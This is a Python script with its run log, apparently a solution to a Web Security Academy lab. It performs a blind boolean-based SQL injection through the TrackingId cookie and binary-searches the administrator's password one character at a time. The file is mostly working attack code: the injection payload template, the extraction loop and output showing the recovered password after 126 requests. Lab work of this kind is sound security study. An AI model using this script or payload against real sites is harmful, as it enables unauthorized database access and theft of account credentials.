import requests
from math import floor


def check(tracking_id):
    response = requests.get(url, cookies=dict(TrackingId=tracking_id))
    if "Welcome back!" in response.text:
        return True
    else:
        return False


def pick_middle_char(string):
    """
    Given a string, return the character at middle of that string
    """
    return string[floor((len(string) - 1) / 2)]


def binary_substring(string, left):
    """
    given a string, this function will pick a middle point, same way as pick_middle_char and
    substring from this middle point (exclusive), to left or right base on pass in param
    """
    middle_index = floor((len(string) - 1) / 2)
    if left:
        return string[:middle_index + 1]
    else:
        return string[middle_index + 1:]




url = "https://ac6f1f551e847ac780c60e7b0085000a.web-security-academy.net/"
password_range = "0123456789abcdefghijklmnopqrstuvwxyz"  # we know that password don't contain uppercase
tracking_id_template = "0K55B73fR8RCfKVq' and substring((select password from users where username = 'administrator'), {}, 1) <= '{}' --"

password = ""
request_count = 0
for i in range(1, 21):
    local_range = password_range
    for _ in range(len(password_range)):  # dummy length
        request_count += 1

        if len(local_range) == 1:
            password += local_range
            print("found", local_range)
            break
        middle_char = pick_middle_char(local_range)
        result = check(tracking_id_template.format(i, middle_char))
        local_range = binary_substring(local_range, result)
        print(i, middle_char, result, local_range)
        # print(tracking_id_template.format(i, middle_char))


print(f"password: {password}")
print(f"total requests: {request_count}")


## Time Wasted 90 minutes
# 1 h False ijklmnopqrstuvwxyz
# 1 q True ijklmnopq
# 1 m True ijklm
# 1 k True ijk
# 1 j True ij
# 1 i True i
# found i
# 2 h False ijklmnopqrstuvwxyz
# 2 q False rstuvwxyz
# 2 v True rstuv
# 2 t True rst
# 2 s True rs
# 2 r True r
# found r
# 3 h True 0123456789abcdefgh
# 3 8 False 9abcdefgh
# 3 d False efgh
# 3 f True ef
# 3 e True e
# found e
# 4 h False ijklmnopqrstuvwxyz
# 4 q True ijklmnopq
# 4 m True ijklm
# 4 k False lm
# 4 l False m
# found m
# 5 h False ijklmnopqrstuvwxyz
# 5 q False rstuvwxyz
# 5 v False wxyz
# 5 x True wx
# 5 w True w
# found w
# 6 h True 0123456789abcdefgh
# 6 8 True 012345678
# 6 4 False 5678
# 6 6 False 78
# 6 7 False 8
# found 8
# 7 h False ijklmnopqrstuvwxyz
# 7 q False rstuvwxyz
# 7 v True rstuv
# 7 t False uv
# 7 u True u
# found u
# 8 h True 0123456789abcdefgh
# 8 8 False 9abcdefgh
# 8 d True 9abcd
# 8 b True 9ab
# 8 a True 9a
# 8 9 False a
# found a
# 9 h True 0123456789abcdefgh
# 9 8 False 9abcdefgh
# 9 d False efgh
# 9 f True ef
# 9 e True e
# found e
# 10 h False ijklmnopqrstuvwxyz
# 10 q False rstuvwxyz
# 10 v True rstuv
# 10 t False uv
# 10 u True u
# found u
# 11 h False ijklmnopqrstuvwxyz
# 11 q False rstuvwxyz
# 11 v False wxyz
# 11 x False yz
# 11 y False z
# found z
# 12 h False ijklmnopqrstuvwxyz
# 12 q True ijklmnopq
# 12 m True ijklm
# 12 k True ijk
# 12 j False k
# found k
# 13 h False ijklmnopqrstuvwxyz
# 13 q False rstuvwxyz
# 13 v True rstuv
# 13 t False uv
# 13 u False v
# found v
# 14 h True 0123456789abcdefgh
# 14 8 True 012345678
# 14 4 True 01234
# 14 2 False 34
# 14 3 True 3
# found 3
# 15 h False ijklmnopqrstuvwxyz
# 15 q False rstuvwxyz
# 15 v True rstuv
# 15 t True rst
# 15 s True rs
# 15 r False s
# found s
# 16 h True 0123456789abcdefgh
# 16 8 False 9abcdefgh
# 16 d True 9abcd
# 16 b True 9ab
# 16 a True 9a
# 16 9 False a
# found a
# 17 h False ijklmnopqrstuvwxyz
# 17 q False rstuvwxyz
# 17 v True rstuv
# 17 t False uv
# 17 u False v
# found v
# 18 h False ijklmnopqrstuvwxyz
# 18 q False rstuvwxyz
# 18 v False wxyz
# 18 x True wx
# 18 w True w
# found w
# 19 h True 0123456789abcdefgh
# 19 8 False 9abcdefgh
# 19 d True 9abcd
# 19 b False cd
# 19 c True c
# found c
# 20 h False ijklmnopqrstuvwxyz
# 20 q True ijklmnopq
# 20 m True ijklm
# 20 k True ijk
# 20 j True ij
# 20 i True i
# found i
# password: iremw8uaeuzkv3savwci
# total requests: 126

# Process finished with exit code 0
